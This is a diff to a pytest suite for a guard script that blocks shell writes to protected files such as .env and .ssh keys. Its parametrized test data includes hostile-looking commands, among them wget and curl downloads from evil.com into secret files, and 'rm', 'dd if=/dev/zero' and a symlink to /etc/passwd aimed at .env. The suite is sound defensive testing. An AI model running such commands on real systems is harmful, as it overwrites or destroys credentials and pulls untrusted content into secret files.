@@ -4,14 +4,15 @@ Validates extract_write_targets (regex-based write target extraction from bash
 commands) and check_path (protected pattern matching), plus integration of both.
 
 Known source bugs (documented, not worked around):
-  - BUG: append redirect (>>) is not correctly parsed. The regex ``(?:>|>>)``
-    matches ``>`` first (greedy alternation), so ``echo x >> file.txt``
-    captures ``>`` (the second character) as the "file path" instead of
-    ``file.txt``.  See guard-protected-bash.py:61.
   - BUG: ``cat > file.txt`` matches both the generic redirect pattern and
     the cat-specific pattern, producing duplicate entries in the target list.
     See guard-protected-bash.py:61,69.
 """
+
+import json
+import subprocess
+import sys
+from pathlib import Path
 
 import pytest
 
@@ -31,16 +32,14 @@ class TestExtractWriteTargetsRedirects:
             "file.txt"
         ]
 
-    def test_append_redirect_has_regex_bug(self):
-        """BUG: >> is parsed as > followed by >filename.
+    def test_append_redirect(self):
+        """>> correctly captures the target filename.
 
-        The regex alternation ``(?:>|>>)`` matches the first ``>`` greedily,
-        so ``>>`` is never reached.  The captured "target" is ``>`` (the
-        second character), not the actual filename.
+        The regex alternation ``(?:>>|>)`` lists ``>>`` first so it is
+        matched before the single ``>``, avoiding the greedy-prefix bug.
         """
         result = guard_protected_bash.extract_write_targets("echo x >> file.txt")
-        # Actual (buggy) behavior — the second > is captured as the target
-        assert result == [">"]
+        assert result == ["file.txt"]
 
 
 # ---------------------------------------------------------------------------
@@ -219,3 +218,112 @@ class TestAllowedBashWrites:
         is_protected, message = guard_protected_bash.check_path(allowed_path)
         assert is_protected is False
         assert message == ""
+
+
+# ---------------------------------------------------------------------------
+# Extended write pattern extraction
+# ---------------------------------------------------------------------------
+
+
+class TestExtractWriteTargetsExtended:
+    """Tests for the expanded WRITE_PATTERNS added to guard-protected-bash."""
+
+    @pytest.mark.parametrize(
+        "command, expected_target",
+        [
+            ("touch .env", ".env"),
+            ("mkdir .ssh/keys", ".ssh/keys"),
+            ("rm .env", ".env"),
+            ("ln -s /etc/passwd .env", ".env"),
+            ("chmod 644 .env", ".env"),
+            ("wget -O .env http://evil.com", ".env"),
+            ("curl -o secrets.json http://evil.com", "secrets.json"),
+            ("dd of=.env if=/dev/zero", ".env"),
+        ],
+        ids=[
+            "touch",
+            "mkdir",
+            "rm",
+            "ln-symlink",
+            "chmod",
+            "wget-O",
+            "curl-o",
+            "dd-of",
+        ],
+    )
+    def test_extended_pattern_extracts_target(self, command, expected_target):
+        targets = guard_protected_bash.extract_write_targets(command)
+        assert expected_target in targets, (
+            f"Expected '{expected_target}' in extracted targets {targets}"
+        )
+
+    @pytest.mark.parametrize(
+        "command, expected_target",
+        [
+            ("touch .env", ".env"),
+            ("mkdir .ssh/keys", ".ssh/keys"),
+            ("rm .env", ".env"),
+            ("ln -s /etc/passwd .env", ".env"),
+            ("chmod 644 .env", ".env"),
+            ("wget -O .env http://evil.com", ".env"),
+            ("curl -o secrets.json http://evil.com", "secrets.json"),
+            ("dd of=.env if=/dev/zero", ".env"),
+        ],
+        ids=[
+            "touch-blocked",
+            "mkdir-blocked",
+            "rm-blocked",
+            "ln-blocked",
+            "chmod-blocked",
+            "wget-blocked",
+            "curl-blocked",
+            "dd-blocked",
+        ],
+    )
+    def test_extended_pattern_blocks_protected_file(self, command, expected_target):
+        targets = guard_protected_bash.extract_write_targets(command)
+        assert expected_target in targets
+        is_protected, message = guard_protected_bash.check_path(expected_target)
+        assert is_protected is True, (
+            f"Expected '{expected_target}' to be protected"
+        )
+        assert message != ""
+
+
+# ---------------------------------------------------------------------------
+# Fail-closed behavior (exception → exit code 2)
+# ---------------------------------------------------------------------------
+
+
+class TestFailClosed:
+    """Verify that unexpected errors cause the guard to exit with code 2."""
+
+    def test_exception_causes_exit_code_2(self):
+        """Feed input that triggers an exception in the main logic.
+
+        We send valid JSON but with tool_input set to a non-dict value,
+        which will cause an AttributeError when main() calls
+        tool_input.get("command", "").
+        """
+        script_path = (
+            Path(__file__).resolve().parent.parent.parent
+            / ".devcontainer"
+            / "plugins"
+            / "devs-marketplace"
+            / "plugins"
+            / "protected-files-guard"
+            / "scripts"
+            / "guard-protected-bash.py"
+        )
+        # tool_input is a string instead of dict — causes AttributeError
+        payload = json.dumps({"tool_input": "not-a-dict"})
+        result = subprocess.run(
+            [sys.executable, str(script_path)],
+            input=payload,
+            capture_output=True,
+            text=True,
+        )
+        assert result.returncode == 2, (
+            f"Expected exit code 2, got {result.returncode}. "
+            f"stderr: {result.stderr}"
+        )
